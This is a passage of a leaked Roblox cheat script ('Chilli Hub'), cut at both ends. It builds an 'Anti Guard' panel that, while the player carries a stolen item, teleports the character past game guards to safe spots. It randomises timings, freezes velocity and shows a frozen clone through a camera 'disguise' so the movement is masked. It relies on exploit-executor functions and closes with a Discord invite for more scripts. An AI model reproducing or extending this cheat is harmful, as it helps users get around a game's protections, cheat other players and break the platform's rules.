			return TweenService:Create(param432, TweenInfo.new(param433, flag674 or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), param434)
		end)

		if ok and result then
			result:Play()
		end
	end

	ScreenGui = func719("ScreenGui", nil, {
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		DisplayOrder = -100,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	})

	Frame = func719("Frame", ScreenGui, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 1, -120),
		Size = UDim2.fromOffset(226, 52),
		BackgroundTransparency = 1,
	})

	UIScale = func719("UIScale", Frame, { Scale = 1 })

	Frame2 = func719("Frame", Frame, {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = tbl509.Card,
		BorderSizePixel = 0,
		Active = true,
	})

	func719("UICorner", Frame2, { CornerRadius = UDim.new(0, 14) })
	UIScale2 = func719("UIScale", Frame2, { Scale = 0.86 })
	func719("UIGradient", Frame2, { Color = ColorSequence.new(tbl509.CardTop, tbl509.Card), Rotation = 90 })

	local UIStroke = func719("UIStroke", Frame2, {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		Transparency = 0.2,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})

	UIGradient = func719("UIGradient", UIStroke, { Color = ColorSequence.new(tbl509.Stroke, tbl509.Stroke) })

	local Frame3 = func719("Frame", Frame2, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(36, 36),
		BackgroundColor3 = Color3.fromRGB(28, 26, 32),
		BorderSizePixel = 0,
		ZIndex = 2,
	})

	func719("UICorner", Frame3, { CornerRadius = UDim.new(0, 11) })
	local UIStroke2 = func719("UIStroke", Frame3, { Thickness = 1.5, Color = tbl509.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })

	local ImageLabel = func719("ImageLabel", Frame3, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(0.86, 0.86),
		BackgroundTransparency = 1,
		Image = "rbxassetid://128961717706452",
		ImageTransparency = 0.35,
		ScaleType = Enum.ScaleType.Crop,
		ZIndex = 3,
	})

	func719("UICorner", ImageLabel, { CornerRadius = UDim.new(0, 8) })
	local UIScale3 = func719("UIScale", ImageLabel, { Scale = 1 })
	local color3 = Color3.fromRGB

	func719("UIGradient", func719("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 7),
		Size = UDim2.new(1, -112, 0, 15),
		Font = Enum.Font.BuilderSansExtraBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Text = "Chilli Hub Leaked by CCPS",
		ZIndex = 2,
	}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), color3(255, 190, 110)) })

	func719("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 22),
		Size = UDim2.new(1, -112, 0, 20),
		Font = Enum.Font.GothamBlack,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = tbl509.Text,
		Text = "Anti Guard",
		ZIndex = 2,
	})

	local TextButton = func719("TextButton", Frame2, {
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Text = "",
		ZIndex = 2,
	})

	func719("UICorner", TextButton, { CornerRadius = UDim.new(1, 0) })
	local UIGradient2 = func719("UIGradient", TextButton, { Color = ColorSequence.new(tbl509.Off, tbl509.Off) })

	local Frame4 = func719("Frame", TextButton, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 3, 0.5, 0),
		Size = UDim2.fromOffset(16, 16),
		BackgroundColor3 = Color3.fromRGB(245, 245, 250),
		BorderSizePixel = 0,
		ZIndex = 3,
	})

	func719("UICorner", Frame4, { CornerRadius = UDim.new(1, 0) })

	local function func721()
		return antiGuard.Enabled and tbl509.AccentA or tbl509.Off
	end

	local function render(flag675)
		local n14 = flag675 and 0 or 0.28

		if antiGuard.Enabled then
			UIGradient2.Color = ColorSequence.new(tbl509.AccentA, tbl509.AccentB)
			local value579 = UIGradient
			local colorSequence = ColorSequence.new
			local value580 = ColorSequenceKeypoint.new(0, tbl509.Stroke)
			local value581 = ColorSequenceKeypoint.new(0.45, tbl509.AccentA)
			local value582 = ColorSequenceKeypoint.new(0.55, tbl509.AccentB)
			local tbl513 = { value580, value581, value582 }

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, tbl509.Stroke))
				table.move(values, 1, values.n, 4, tbl513)
			end

			value579.Color = colorSequence(tbl513)
			func716(Frame4, n14, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
			func716(ImageLabel, n14, { ImageTransparency = 0 })
			func716(UIStroke, 0.3, { Transparency = 0 })
		else
			UIGradient2.Color = ColorSequence.new(tbl509.Off, tbl509.Off)
			UIGradient.Color = ColorSequence.new(tbl509.Stroke, tbl509.Stroke)
			func716(Frame4, n14, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
			func716(ImageLabel, n14, { ImageTransparency = 0.35 })
			func716(UIStroke, 0.3, { Transparency = 0.2 })
		end

		local flashUntil = flag672.FlashUntil

		if os.clock() >= flashUntil then
			func716(UIStroke2, n14, { Color = func721() })
		end
	end

	func717 = function(param435, param436)
		flag672.FlashRequest = { Color = param435, Hold = param436 }
	end

	local function func722()
		local flashRequest = flag672.FlashRequest
		if not flashRequest then
			return
		end
		flag672.FlashRequest = nil
		flag672.FlashUntil = os.clock() + (flashRequest.Hold or 0)
		func716(UIStroke2, 0.2, { Color = flashRequest.Color })

		if flashRequest.Hold then
			task.delay(flashRequest.Hold, function()
				local flag676 = flag671

				if flag671 then
					local flashUntil = flag672.FlashUntil
					flag676 = os.clock() >= flashUntil
				end

				if flag676 then
					func716(UIStroke2, 0.3, { Color = func721() })
				end
			end)
		end
	end

	local function func723(param437)
		local handle = antiGuard.Handle
		if type(handle) ~= "table" then
			return
		end

		for _, item191 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return handle[item191]
			end)

			if ok and type(result) == "function" and pcall(result, handle, param437) then
				return
			end
		end
	end

	antiGuard.Render = render

	local TextButton2 = func719("TextButton", Frame2, {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 10,
	})

	list85[#list85 + 1] = TextButton2.MouseButton1Click:Connect(function()
		antiGuard.Enabled = not antiGuard.Enabled
		render(false)
		func723(antiGuard.Enabled)
		func716(UIScale3, 0.12, { Scale = 1.15 })

		task.delay(0.12, function()
			if flag671 then
				func716(UIScale3, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
			end
		end)
	end)

	local size = TextButton.Size

	list85[#list85 + 1] = TextButton2.MouseEnter:Connect(function()
		func716(TextButton, 0.15, { Size = size + UDim2.fromOffset(2, 2) })
	end)

	list85[#list85 + 1] = TextButton2.MouseLeave:Connect(function()
		func716(TextButton, 0.15, { Size = size })
	end)

	local byName6 = {
		Hotbar = true,
		HotBar = true,
		Toolbar = true,
		ToolBar = true,
		Backpack = true,
		Inventory = true,
	}

	local list87 = {}
	local huge = math.huge
	local huge2 = math.huge
	local rotation = 0
	local n14 = nil

	local function func724(instance30)
		while instance30 do
			if instance30:IsA("GuiObject") and not instance30.Visible then
				return false
			end

			if instance30:IsA("LayerCollector") then
				return instance30.Enabled
			end
			instance30 = instance30.Parent
		end

		return false
	end

	local function func725()
		local ok, result = pcall(function()
			return GuiService2:GetGuiInset().Y
		end)

		return ok and result or 0
	end

	local function func726(list88)
		local value583 = nil

		for _, descendant in ipairs(list88:GetDescendants()) do
			if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
				local y = descendant.AbsolutePosition.Y

				if not value583 or y < value583 then
					value583 = y
				end
			end
		end

		return value583 or list88.AbsolutePosition.Y
	end

	local function func727()
		table.clear(list87)
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("GuiObject") and byName6[descendant.Name] then
				list87[#list87 + 1] = descendant
			end
		end
	end

	local function func728()
		local list89 = {}

		pcall(function()
			if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
				return
			end

			for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
				if child:IsA("GuiObject") then
					list89[#list89 + 1] = child
				end
			end
		end)

		for _, item192 in ipairs(list87) do
			if item192.Parent then
				list89[#list89 + 1] = item192
			end
		end

		return list89
	end

	local function func729()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local viewportSize = currentCamera.ViewportSize
		if viewportSize.X < 10 or viewportSize.Y < 10 then
			return
		end
		local touchEnabled = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
		local n15 = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
		local scale = touchEnabled and math.clamp(n15 * 1.05, 0.6, 0.8) * 0.97 or math.clamp(n15, 0.8, 1.1)
		UIScale.Scale = scale
		local backgroundTransparency = touchEnabled and 0.3 or 0

		if Frame2.BackgroundTransparency ~= backgroundTransparency then
			Frame2.BackgroundTransparency = backgroundTransparency
			Frame3.BackgroundTransparency = backgroundTransparency
		end

		local n16 = viewportSize.Y - 8 * scale
		local flag677 = false

		for _, item193 in ipairs(func728()) do
			local ok, result = pcall(func724, item193)

			if ok and result then
				local absoluteSize = item193.AbsoluteSize
				local y = item193.AbsolutePosition.Y

				if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
					local ok2, result2 = pcall(func726, item193)
					result2 = ok2 and result2 or y
					flag677 = true
					n16 = math.min(n16, result2 + func725(item193))
				end
			end
		end

		if flag677 then
			n14 = viewportSize.Y - n16
		elseif n14 then
			n16 = viewportSize.Y - n14
		end

		local n17 = math.max(n16 - (touchEnabled and 4 or 6) * scale - n13 * scale / 2, n13 * scale / 2 + 8)
		Frame.Position = UDim2.new(0.5, 0, 0, n17)
	end

	list85[#list85 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
		func722()
		huge += deltaTime
		huge2 += deltaTime

		if huge >= 3 then
			huge = 0
			pcall(func727)
		end

		if huge2 >= 0.2 then
			huge2 = 0
			pcall(func729)
		end

		if antiGuard.Enabled then
			rotation = (rotation + deltaTime * (flag672.Active and 360 or 90)) % 360
			UIGradient.Rotation = rotation
		end
	end)

	render(true)
end

antiGuard.ShowPanel = function(enabled3)
	ScreenGui.Enabled = enabled3 == true
end

ScreenGui.Enabled = antiGuard.PanelShown == true
ScreenGui.Parent = hui
func716(UIScale2, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)

do
	local function func730()
		local flag678 = str1.Root()
		if not flag678 then
			return nil
		end

		for _, child in ipairs(workspace:GetChildren()) do
			if child:IsA("Model") and child:FindFirstChild("Hitbox") then
				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						local flag679

						if ok then
							flag679 = result == flag678 or result2 == flag678
						else
							flag679 = ok
						end

						if flag679 then
							return child
						end
					end
				end
			end
		end

		return nil
	end

	local function func731(list90, parent)
		local tbl514 = {}

		for _, descendant in ipairs(list90:GetDescendants()) do
			tbl514[descendant] = descendant.Archivable

			pcall(function()
				descendant.Archivable = true
			end)
		end

		local archivable = list90.Archivable
		list90.Archivable = true

		local ok, result = pcall(function()
			return list90:Clone()
		end)

		list90.Archivable = archivable

		for k, value584 in pairs(tbl514) do
			pcall(function()
				k.Archivable = value584
			end)
		end

		if not ok or not result then
			return nil
		end
		result.Name = func715()

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
				pcall(function()
					descendant:Destroy()
				end)
			elseif descendant:IsA("BasePart") then
				descendant.Anchored = true
				descendant.CanCollide = false
				descendant.CanQuery = false
				descendant.CanTouch = false
			elseif descendant:IsA("Humanoid") then
				descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
				descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
			end
		end

		result.Parent = parent
		return result
	end

	local function func732(flag680, num153)
		local currentCamera = workspace.CurrentCamera
		if not flag680 or not currentCamera or flag672.Disguise then
			return
		end
		num153 = num153 or Vector3.zero
		local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
		flag672.Disguise = disguise
		local list91 = { flag680 }
		local ok, result = pcall(func730)

		if ok and result then
			list91[#list91 + 1] = result
		end

		for _, item194 in ipairs(list91) do
			for _, descendant in ipairs(item194:GetDescendants()) do
				if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
					disguise.Hidden[#disguise.Hidden + 1] = descendant
				end
			end
		end

		local function func733()
			for _, item195 in ipairs(disguise.Hidden) do
				pcall(function()
					item195.LocalTransparencyModifier = 1
				end)
			end

			pcall(function()
				if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
					currentCamera.CameraType = Enum.CameraType.Scriptable
				end

				currentCamera.CFrame = disguise.CameraCFrame
			end)
		end

		func733()
		disguise.BindName = func715()

		if not pcall(function()
			RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, func733)
		end) then
			disguise.BindName = nil
			disguise.Link = RunService.RenderStepped:Connect(func733)
		end

		disguise.Beat = RunService.Heartbeat:Connect(func733)

		for _, item196 in ipairs(list91) do
			local ok2, result2 = pcall(func731, item196, currentCamera)

			if ok2 and result2 then
				if num153.Magnitude > 0.01 then
					for _, descendant in ipairs(result2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CFrame = descendant.CFrame + num153
							end)
						end
					end
				end

				disguise.Copies[#disguise.Copies + 1] = result2
			end
		end
	end

	local function func734()
		local disguise = flag672.Disguise
		if not disguise then
			return
		end
		flag672.Disguise = nil

		if disguise.BindName then
			pcall(function()
				RunService:UnbindFromRenderStep(disguise.BindName)
			end)
		end

		if disguise.Link then
			pcall(function()
				disguise.Link:Disconnect()
			end)
		end

		if disguise.Beat then
			pcall(function()
				disguise.Beat:Disconnect()
			end)
		end

		for _, item197 in ipairs(disguise.Hidden) do
			pcall(function()
				item197.LocalTransparencyModifier = 0
			end)
		end

		pcall(function()
			disguise.Camera.CameraType = disguise.CameraType
		end)

		for _, copy in ipairs(disguise.Copies) do
			pcall(function()
				copy:Destroy()
			end)
		end
	end

	local function func735()
		for _, item198 in ipairs(tbl510) do
			local obj110 = workspace

			for _, item199 in ipairs(item198.Path) do
				obj110 = obj110 and obj110:FindFirstChild(item199) or nil
			end

			if obj110 and obj110:IsA("BasePart") then
				return obj110.CFrame:PointToWorldSpace(item198.Offset)
			end
		end

		return Vector3.new(528.7, 70.57, -364.11)
	end

	local function func736(list92, part25, num154, num155, flag681)
		local cFrame = CFrame.new(num154) * num155

		pcall(function()
			list92:PivotTo(cFrame)
		end)

		if (part25.Position - num154).Magnitude > 3 then
			pcall(function()
				part25.CFrame = cFrame
			end)
		end

		if flag681 == false then
			return
		end

		for _, descendant in ipairs(list92:GetDescendants()) do
			if descendant:IsA("BasePart") then
				pcall(function()
					descendant.AssemblyLinearVelocity = Vector3.zero
					descendant.AssemblyAngularVelocity = Vector3.zero
				end)
			end
		end
	end

	local function func737()
		local areaId = flag672.AreaId

		if type(areaId) ~= "string" or areaId == "" then
			areaId = type(str1.Steal) == "table" and str1.Steal.CarryAreaId or nil
		end

		if type(areaId) ~= "string" or areaId == "" then
			areaId = localPlayer:GetAttribute("AreaId")
			areaId = type(areaId) == "string" and areaId or nil
		end

		return areaId
	end

	local tbl515 = { lightdark = "LightDark" }

	local function func738(param438)
		if type(param438) ~= "string" then
			return "Default"
		end
		local lower = string.lower
		local cleaned6 = string.gsub(param438, "[^%a]", "")
		return tbl515[lower(cleaned6)] or "Default"
	end

	local function func739()
		local ok, result = pcall(function()
			return getgenv().ChilliAntiGuard
		end)

		if ok and type(result) == "table" then
			if type(result.Steps) == "table" then
				return result
			end
			local default = result[func738(func737())] or result.Default
			if type(default) == "table" then
				return default
			end
		end

		return chilliAntiGuard[func738(func737())] or tbl508
	end

	local function func740()
		local result101 = func739()
		local options = antiGuard.Options
		if type(options) ~= "table" or options.Destination == "Safe Zone" and not options.Stay then
			return result101
		end
		local tbl516 = {}

		for k, value585 in pairs(result101) do
			tbl516[k] = value585
		end

		if options.Destination == "Next To Line" then
			tbl516.Target = "edge"
			tbl516.LineOffset = 6
			tbl516.Height = 0
			tbl516.OffsetX = 0
			tbl516.OffsetZ = 0
		elseif options.Destination == "Saved Spot" and typeof(options.Spot) == "Vector3" then
			tbl516.Target = "point"
			tbl516.Point = options.Spot
			tbl516.Height = 0
			tbl516.OffsetX = 0
			tbl516.OffsetZ = 0
		end

		if options.Stay and type(result101.Steps) == "table" then
			local steps = {}

			for _, step in ipairs(result101.Steps) do
				if type(step) == "table" and step.To ~= "start" then
					steps[#steps + 1] = step
				end
			end

			tbl516.Steps = steps
		end

		return tbl516
	end

	local function func741(param439, num156)
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		local separationLine = world and world:FindFirstChild("SeparationLine")

		if separationLine and separationLine:IsA("BasePart") then
			local cFrame = separationLine.CFrame
			local value586 = (Vector3.new(0, 1, 0)):Cross(separationLine.Size.X >= separationLine.Size.Z and cFrame.RightVector or cFrame.LookVector)
			local vector = Vector3.new(value586.X, 0, value586.Z)

			if vector.Magnitude > 0.001 then
				local unit = vector.Unit
				local n14 = cFrame.Position + ((num156 - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(param439.LineOffset) or 8)
				return Vector3.new(n14.X, num156.Y + 0.5, n14.Z)
			end
		end

		return nil
	end

	local function func742(param440, num157)
		local str79 = tostring(param440.Target or "home")
		if str79 == "sky" then
			return num157
		end

		if str79 == "point" then
			if typeof(param440.Point) == "Vector3" then
				return param440.Point
			end
			return num157
		end

		if str79 == "line" then
			local value587 = func741(param440, num157)
			if value587 then
				return value587
			end
		end

		if str79 == "edge" then
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")

			if world and world:IsA("BasePart") then
				local cFrame = world.CFrame
				local rightVector = world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector
				local vector = Vector3.new(rightVector.X, 0, rightVector.Z)
				local value588 = (Vector3.new(0, 1, 0)):Cross(vector)
				local vector2 = Vector3.new(value588.X, 0, value588.Z)

				if vector2.Magnitude > 0.001 and vector.Magnitude > 0.001 then
					local unit = vector.Unit
					local unit2 = vector2.Unit
					local n14 = num157 - cFrame.Position
					local n15 = -world.Size.Magnitude / 2
					local n16 = world.Size.Magnitude / 2
					local n17 = cFrame.Position + unit * math.clamp(n14:Dot(unit), n15, n16) + (n14:Dot(unit2) >= 0 and unit2 or -unit2) * (tonumber(param440.LineOffset) or 6)
					local result102 = func735()
					return Vector3.new(n17.X, (result102 and result102.Y or num157.Y) + 3, n17.Z)
				end
			end
		end

		return func735()
	end

	local function func743(param441, param442)
		return func742(param441, param442) + Vector3.new(tonumber(param441.OffsetX) or 0, tonumber(param441.Height) or 0, tonumber(param441.OffsetZ) or 0)
	end

	local function func744()
		flag672.Active = false
		antiGuard.Busy = false
	end

	local function func745(param443)
		local n14 = math.max(tonumber(param443) or 0, 0)
		if n14 <= 0 then
			return 0
		end
		return (math.random() * 2 - 1) * n14
	end

	local function func746(param444)
		local steps = type(param444.Steps) == "table" and param444.Steps or {}
		local n14 = tonumber(param444.ReleaseAt) or 0
		local n15 = math.max(tonumber(param444.StartAt) or 0, 0)
		local n16 = math.max(tonumber(param444.StartRandom) or 0, 0)
		local n17 = math.max(tonumber(param444.HopRandom) or 0, 0)
		local n18 = math.max(tonumber(param444.HoldRandom) or 0, 0)
		if n16 <= 0 and n17 <= 0 and n18 <= 0 then
			return steps, n14, n15
		end
		local n19 = math.max(n15 + func745(n16), 0)
		local tbl517 = {}
		local n20 = 0
		local n21 = 0

		for i, step in ipairs(steps) do
			if type(step) == "table" then
				local n22 = math.max(tonumber(step.At) or 0, 0)
				n21 = math.max(n21 + math.max(n22 - n20, 0) + func745(step.To == "start" and n18 or n17), n19)
				tbl517[i] = { At = n21, To = step.To, Glide = step.Glide }
				n20 = n22
				continue
			end

			break
		end

		return tbl517, n21 + math.max(n14 - n20, 0), n19
	end

	local function func747(num158)
		local character = localPlayer.Character
		local flag682 = str1.Root()
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if not flag682 or not humanoid or humanoid.Health <= 0 then
			func744()
			func717(tbl509.Bad, 1.6)
			return
		end

		local function func748()
			return flag671 and flag682.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
		end

		local platformStand = humanoid.PlatformStand
		local cFrame = flag682.CFrame
		local position = cFrame.Position
		local result103 = func740()
		local value589, value590, value591 = func746(result103)
		local freeze = result103.Freeze ~= false
		local str80 = tostring(result103.Facing or "Keep")
		local n14 = math.max(tonumber(result103.Jitter) or 0, 0)
		local cframe = str80 == "Zero" and CFrame.new() or cFrame.Rotation

		local function func749()
			if str80 == "Spin" then
				return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
			end
			return cframe
		end

		local function func750(num159)
			if n14 <= 0 then
				return num159
			end
			return num159 + Vector3.new((math.random() * 2 - 1) * n14, 0, (math.random() * 2 - 1) * n14)
		end

		local value592 = func743(result103, position)

		local function func751(param445)
			while func748() and os.clock() - num158 < param445 do
				RunService.Heartbeat:Wait()

				if freeze then
					pcall(function()
						flag682.AssemblyLinearVelocity = Vector3.zero
						flag682.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			return func748()
		end

		local function func752(num160, param446)
			func736(character, flag682, num160, param446, freeze)
			RunService.PreSimulation:Wait()

			if func748() and (flag682.Position - num160).Magnitude > 3 then
				func736(character, flag682, num160, param446, freeze)
			end
		end

		pcall(function()
			humanoid.BreakJointsOnDeath = false
		end)

		if result103.Disguise ~= false then
			pcall(func732, character, Vector3.zero)
		end

		func717(tbl509.Work)

		if func751(value591) and result103.Limp ~= false then
			humanoid.PlatformStand = true
		end

		local value593 = position

		for _, item200 in ipairs(value589) do
			local flag683 = type(item200) ~= "table"

			if not flag683 then
				flag683 = not func751(tonumber(item200.At) or 0)
			end

			if not flag683 then
				local to = item200.To == "start" and position or func750(value592)
				local result104 = func749()

				if type(item200.Glide) == "table" and #item200.Glide > 0 then
					for _, item201 in ipairs(item200.Glide) do
						if func748() then
							local clamp = math.clamp
							local n15 = tonumber(item201) or 1
							local func753 = func736
							local lerp = value593.Lerp
							local value594 = clamp(n15, 0, 1)
							func753(character, flag682, lerp(value593, to, value594), result104, freeze)
							RunService.Heartbeat:Wait()
							continue
						end

						break
					end

					value593 = to
				else
					func752(to, result104)
					value593 = to
				end

				continue
			end

			break
		end

		func751(value590)

		pcall(function()
			humanoid.PlatformStand = platformStand
		end)

		func734()
		func744()

		if func748() and flag672.Carrying then
			func717(tbl509.Good, 1.6)
		else
			func717(tbl509.Bad, 1.6)
		end
	end

	local function func754(param447)
		if not pcall(func747, param447) then
			pcall(function()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end
			end)

			func734()
			func744()
			func717(tbl509.Bad, 1.6)
		end
	end

	local n14 = 25

	local function func755()
		if antiGuard.HitArms <= 0 then
			return false
		end

		if n14 < os.clock() - (antiGuard.HitArmedAt or 0) then
			antiGuard.HitArms = 0
			return false
		end
		return true
	end

	local function func756()
		local carrying = flag672.Carrying
		flag672.Carrying = flag672.SignalCarrying or flag672.WeldCarrying
		local enabled = flag672.Carrying and not carrying and flag671 and antiGuard.Enabled
		local flag684

		if enabled then
			flag684 = not (str1.SafeCarry.LineDrop and str1.Steal.Active)
		else
			flag684 = enabled
		end

		if flag684 then
			flag684 = not (str1.Steal.Active and str1.BossPortalUp())
		end

		if flag684 and not flag672.Active and not func755() then
			flag672.Active = true
			antiGuard.Busy = true
			antiGuard.BusySince = os.clock()
			task.spawn(func754, os.clock())
		end
	end

	local eggState = tbl1.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(param448)
			local signalCarrying = type(param448) == "table" and param448.IsCarrying == true

			if signalCarrying and param448.GuardDisabled == true then
				signalCarrying = false
			end

			if signalCarrying and type(param448.AreaId) == "string" then
				flag672.AreaId = param448.AreaId
			end

			if not signalCarrying then
				flag672.AreaId = nil
			end

			flag672.SignalCarrying = signalCarrying
			func756()
		end)

		if ok and result then
			list85[#list85 + 1] = result
		end
	end

	local n15 = 0

	list85[#list85 + 1] = RunService.Heartbeat:Connect(function(deltaTime)
		local busy = antiGuard.Busy or flag672.Active

		if busy then
			local busySince = antiGuard.BusySince
			busy = os.clock() - busySince > math.max(tonumber(func740().BusyLimit) or tbl508.BusyLimit, (tonumber(func740().ReleaseAt) or 0) + 1)
		end

		if busy then
			func734()
			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.PlatformStand then
				pcall(function()
					humanoid.PlatformStand = false
				end)
			end

			func744()
		end

		func755()
		n15 += deltaTime
		if n15 < tbl508.WeldScanGap then
			return
		end
		n15 = 0
		local weldCarrying = func730() ~= nil

		if weldCarrying ~= flag672.WeldCarrying then
			flag672.WeldCarrying = weldCarrying
			func756()
		end
	end)

	func4(function()
		flag671 = false

		for _, item202 in ipairs(list85) do
			pcall(function()
				item202:Disconnect()
			end)
		end

		table.clear(list85)
		func734()
		func744()
		antiGuard.Render = nil
		antiGuard.ShowPanel = nil

		pcall(function()
			ScreenGui:Destroy()
		end)
	end)
end

do
	local obj111 = obj2:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
	local discordUrl = "discord.gg/CJK4bs2mgT"
	local url2 = "rbxassetid://128961717706452"
	local n14 = 0.5
	local n15 = 0.0909
	local n16 = 0.2
	local n17 = 5.4
	local n18 = 4.2
	local n19 = 5.2
	local n20 = 6
	local n21 = 3.6
	local n22 = 6.4
	local n23 = 2
	local n24 = 11.4
	local n25 = 3
	local n26 = 0.35

	local tbl518 = {
		{
			Color = "#FF6A55",
			Title = "New Scripts &amp; Updates",
			Text = "Patch notes and new game scripts are posted there first.",
		},
		{
			Color = "#FFB054",
			Title = "Giveaways",
			Text = "Member giveaways and events are announced in the server.",
		},
		{
			Color = "#9AA3FF",
			Title = "Support",
			Text = "Ask for help, report bugs and get answers from the team.",
		},
		{
			Color = "#6EE49C",
			Title = "Suggestions",
			Text = "Request features and vote on what gets added next.",
		},
	}

	local n27 = n24 + #tbl518 * (n25 + n26) + 2.4 + n16 * 2
	local colorSequence = ColorSequence.new
	local value595 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96))
	local value596 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60))
	local new = ColorSequenceKeypoint.new
	local color3 = Color3.fromRGB
	local tbl519 = { value595, value596 }

	do
		local values = table.pack(new(1, color3(255, 82, 64)))
		table.move(values, 1, values.n, 3, tbl519)
	end

	local value597 = colorSequence(tbl519)
	local color4 = Color3.fromRGB
	local colorSequence2 = ColorSequence.new(Color3.fromRGB(74, 24, 18), color4(14, 11, 15))
	local tbl520 = { Perks = {} }
	local n28 = 0

	local function callback26()
		local value598 = setclipboard or toclipboard
		local ok = type(value598) == "function" and pcall(value598, "https://discord.gg/CJK4bs2mgT") or false
		func651(ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/CJK4bs2mgT")
		if not tbl520.Copy then
			return
		end
		n28 += 1
		local flag685 = n28

		tbl520.Copy.Set({
			Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
			Background = ok and "#2EB070" or "#5865F2",
		})

		task.delay(1.8, function()
			if flag685 == n28 and tbl520.Copy then
				tbl520.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
			end
		end)
	end

	local function func757(param449)
		if not tbl520.Hero then
			return
		end
		local n29 = n16 * 2
		local n30 = math.max(param449, 14) - n29
		local n31 = math.max(1, n30 - n19 - n14)
		local n32 = math.max(1, n30 - n22 - n14 * 3)
		local n33 = math.max(1, n30 - 1.2)
		tbl520.Hero.Set({ Width = n30 })
		tbl520.Title.Set({ Width = n31 })
		tbl520.Subtitle.Set({ Width = n31 })
		tbl520.Members.Set({ Width = n31 })
		tbl520.Invite.Set({ Width = n30 })
		tbl520.Label.Set({ Width = n32 })
		tbl520.Link.Set({ Width = n32 })
		tbl520.Copy.Set({ X = n30 - n22 - n14 })
